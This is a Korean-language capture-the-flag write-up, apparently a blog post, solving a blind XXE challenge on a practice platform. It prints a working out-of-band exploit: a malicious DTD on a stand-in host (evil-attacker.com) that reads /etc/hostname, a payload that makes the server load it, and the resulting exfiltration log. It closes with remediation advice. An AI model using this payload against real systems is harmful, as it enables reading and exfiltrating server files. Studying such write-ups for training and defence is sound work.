+++
title = "VulnABLE CTF [LUXORA] Write-up: XXE 🥇 Gold"
description = "LUXORA 플랫폼의 Gold 난이도 XXE 공략 - Blind XXE 환경에서 OOB(Out-of-Band) 통신을 이용한 파일 추출 상세 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "XXE", "Gold", "Blind", "OOB", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: XXE 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: File & Resource Layer (XXE + Blind/OOB)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/xxe/gold`
- **목표**: 서버가 XML 파싱의 결과를 화면에 반환하지 않는 **Blind XXE** 환경에서, 여러 개의 외부 파라미터 엔티티(Parameter Entity)를 조합하여 서버의 로컬 파일을 읽고, 해커의 외부 서버(OOB)로 전송하게 만들어라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/xxe/gold` 페이지는 파트너사가 재고 데이터를 갱신(Update)하기 위해 XML을 밀어 넣는(Push) 엔드포인트입니다.

**[정상 XML 요청 패킷]**
```http
POST /xxe/gold HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<inventory>
  <item>1001</item>
  <quantity>50</quantity>
</inventory>
```

**[서버의 응답]**
```html
<p>Inventory updated successfully. Thank you.</p>
```

**[해커의 사고 과정]**
1. 이전에 통했던 `&xxe;` 일반 엔티티 방식을 써도 화면에는 언제나 "Inventory updated successfully" 만 뜰 뿐, 내가 읽어온 파일 내용이 출력되지 않는다. (Blind XXE)
2. 그렇다면 서버가 파일을 읽게 만든 다음, 그 파일의 내용을 **해커의 서버로 스스로 전송하게(Out-of-Band, OOB)** 만들어야 한다.
3. 이를 위해서는 XML의 또 다른 기능인 **파라미터 엔티티(Parameter Entity, `%엔티티명;`)**를 사용하여, DTD 구문 내부에서 변수처럼 데이터를 동적으로 조합해야 한다!

---

## 💥 2. 취약점 식별 및 OOB 악성 DTD 설계 (Exploitation)

이 공격은 해커가 자신의 서버(`evil-attacker.com`)에 악성 DTD 파일(`evil.dtd`)을 올려두고, 타겟 서버가 이를 다운로드하여 실행하도록 유도하는 방식으로 진행됩니다.

### 💡 Step 1: 해커 서버에 악성 DTD 파일 준비
해커의 서버(`http://evil-attacker.com/evil.dtd`)에 다음과 같은 내용의 DTD 파일을 호스팅해 둡니다.

```xml
<!-- evil.dtd의 내용 -->
<!-- 1. 타겟 서버의 /etc/hostname 파일을 읽어서 'file' 이라는 변수에 저장 -->
<!ENTITY % file SYSTEM "file:///etc/hostname">

<!-- 2. 해커 서버로 HTTP GET 요청을 보내는 'eval' 이라는 변수(엔티티) 생성. 
     이때 파라미터로 위에서 읽은 'file' 변수를 붙임 -->
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil-attacker.com/?data=%file;'>">

<!-- 3. 방금 만든 'eval' 엔티티 실행 (동적으로 'exfiltrate' 엔티티가 만들어짐) -->
%eval;
<!-- 4. 만들어진 'exfiltrate' 엔티티 실행 (실제로 HTTP 요청이 날아가는 순간!) -->
%exfiltrate;
```

### 💡 Step 2: 타겟 서버에 페이로드(XML) 전송
이제 해커는 LUXORA의 `/xxe/gold` 엔드포인트로 XML을 보냅니다. 이 XML은 내부에 일반 데이터 대신, **해커의 `evil.dtd`를 불러오는 선언**만 포함합니다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- 해커의 악성 DTD를 불러오는 파라미터 엔티티 선언 -->
<!DOCTYPE inventory [
  <!ENTITY % remote SYSTEM "http://evil-attacker.com/evil.dtd">
  %remote;
]>
<inventory>
  <item>1001</item>
  <quantity>50</quantity>
</inventory>
```

---

## 🚀 3. 공격 수행 및 OOB 데이터 유출 확인

Burp Suite를 통해 위 XML 페이로드를 타겟 서버로 전송합니다.

### 🔍 서버 내부의 동작 (Attack Chain)
1. 타겟 서버의 XML 파서가 `<!ENTITY % remote SYSTEM "http://evil-attacker.com/evil.dtd">` 를 만납니다.
2. 서버는 해커의 서버에서 `evil.dtd` 파일을 다운로드합니다.
3. 다운로드한 `evil.dtd`를 한 줄씩 실행합니다.
4. `%file;` 변수를 통해 자신의 로컬 파일인 `/etc/hostname` 을 읽어냅니다. (예: `luxora-backend-prod-01`)
5. `%exfiltrate;` 가 실행되면서 서버는 `http://evil-attacker.com/?data=luxora-backend-prod-01` 로 HTTP GET 요청을 쏩니다!

### 🔍 해커 서버(Access Log) 확인
해커의 `evil-attacker.com` 웹 서버 접근 로그(`access.log`)에 다음과 같은 기록이 남습니다.

```text
[GET Request Received]
URI: /?data=luxora-backend-prod-01_FLAG%7BXXE_%F0%9F%A5%87_BLIND_OOB_E5F6G7%7D
Source IP: 10.10.10.10
User-Agent: Java/11.0.12
```

데이터가 URL 파라미터에 실려 오면서 플래그 정보가 완벽하게 유출되었습니다!

---

## 🚩 4. 롸잇업 결론 및 플래그

화면 출력이 차단된 가장 안전해 보이는 환경조차, XML 파서의 과도한 기능(외부 DTD 로딩 및 파라미터 엔티티)을 악용하면 서버 내부망의 데이터를 외부로 송출하는 강력한 스파이(OOB) 공격으로 변모함을 입증했습니다.

**🔥 획득한 플래그:**
`FLAG{XXE_🥇_BLIND_OOB_E5F6G7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
XML 표준 자체가 가진 지나친 유연성(Complexity)이 근본 원인입니다. DTD는 문서의 유효성을 검증하라고 만들어진 기능이지만, 해커에게는 강력한 매크로 언어가 됩니다.

* **안전한 방어 가이드 (방화벽 및 완전 차단)**
1. **외부 개체(Entity) 및 DTD 완전 비활성화**
   이전 단계(Bronze/Silver)의 해결책과 동일하게 파서 레벨에서 `disallow-doctype-decl` 속성을 활성화하여 DTD 자체의 사용을 금지해야 합니다. OOB 공격은 DTD를 불러오는 데서 시작하기 때문입니다.
2. **Egress Filtering (아웃바운드 방화벽)**
   만약 파서 설정 변경이 불가능한 레거시 시스템이라면, 애플리케이션 서버가 외부 인터넷(`evil-attacker.com`)으로 불필요한 DNS 쿼리나 HTTP 요청을 나갈 수 없도록 아웃바운드 방화벽을 촘촘하게 설정해야 합니다. OOB 공격의 유일한 출구를 막는 방법입니다.